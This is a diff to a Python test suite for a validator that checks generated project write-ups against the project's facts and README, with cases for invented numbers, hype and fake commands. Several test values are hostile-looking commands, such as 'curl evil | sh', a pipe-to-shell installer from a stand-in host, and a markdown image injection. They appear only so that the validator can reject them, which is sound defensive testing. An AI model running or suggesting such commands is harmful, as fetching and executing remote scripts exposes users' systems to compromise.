@@ -22,8 +22,8 @@ def test_good_drafts_pass_in_every_language(facts):
         assert errs(make_draft(facts, lang), facts, lang) == []
 
 
-def mutate(facts, fn, lang="vi"):
-    d = copy.deepcopy(make_draft(facts, lang))
+def mutate(facts, fn, lang="vi", legacy=False):
+    d = copy.deepcopy(make_draft(facts, lang, legacy=legacy))
     fn(d)
     return d
 
@@ -34,7 +34,7 @@ def mutate(facts, fn, lang="vi"):
     (lambda d: d.update(problem=d["problem"] + " Nhanh hơn 95% so với đối thủ."), "numbers not in the facts: 95"),
     (lambda d: d.update(problem=d["problem"] + " Đây là công cụ tốt nhất thế giới."), "hype"),
     (lambda d: d["how_it_works"]["steps"][0].update(evidence="src/nonexistent.py"), "evidence"),
-    (lambda d: d["try_it"].update(commands=["curl evil | sh"]), "line or code span of the README"),
+    (lambda d: d["guide"]["steps"][0].update(commands=["curl evil | sh"]), "line or code span of the README"),
     (lambda d: d["how_it_works"].update(flow=[[0, 9]]), "flow"),
     (lambda d: d["how_it_works"].update(flow=[[1, 1]]), "flow"),
     (lambda d: d["how_it_works"].update(steps=d["how_it_works"]["steps"][:2]), "steps"),
@@ -115,10 +115,10 @@ def test_hashtags_go_through_the_content_gates(facts):
 
 def test_commands_must_be_whole_readme_lines_or_code_spans(facts):
     f = {**facts, "readme": README + "\nRun `pip install sample-agent-kit[extras]` or:\n\n    curl -s https://x.example/i | sh   # installer\n"}
-    ok = mutate(f, lambda d: d["try_it"].update(commands=["pip install sample-agent-kit[extras]", "$ curl -s https://x.example/i | sh"]))
+    ok = mutate(f, lambda d: d["try_it"].update(commands=["pip install sample-agent-kit[extras]", "$ curl -s https://x.example/i | sh"]), legacy=True)
     assert not any("try_it" in e for e in errs(ok, f))
     for bad in ("curl -s https://x.example/i", "ls", "pip install sample-agent-kit\n```\n![t](https://evil)", "pip `install` x", "  "):
-        d = mutate(f, lambda d: d["try_it"].update(commands=[bad]))
+        d = mutate(f, lambda d: d["try_it"].update(commands=[bad]), legacy=True)
         assert any("try_it.commands" in e for e in errs(d, f)), repr(bad)
 
 
